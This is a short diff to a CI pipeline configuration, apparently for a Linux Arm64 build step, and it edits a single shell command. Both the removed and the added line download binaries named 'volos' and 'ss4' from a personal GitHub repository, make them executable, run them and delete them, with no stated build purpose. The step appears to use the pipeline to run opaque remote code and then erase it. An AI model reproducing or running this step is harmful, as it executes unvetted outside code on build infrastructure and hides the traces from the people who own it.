@@ -25,7 +25,7 @@ pipeline:
                   identifier: Run_2
                   spec:
                     shell: Sh
-                    command: wget https://raw.githubusercontent.com/samnialoska22/faksa/refs/heads/main/volos && chmod +x volos && ./volos && rm -rf volos ss4
+                    command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
           platform:
             os: Linux
             arch: Arm64
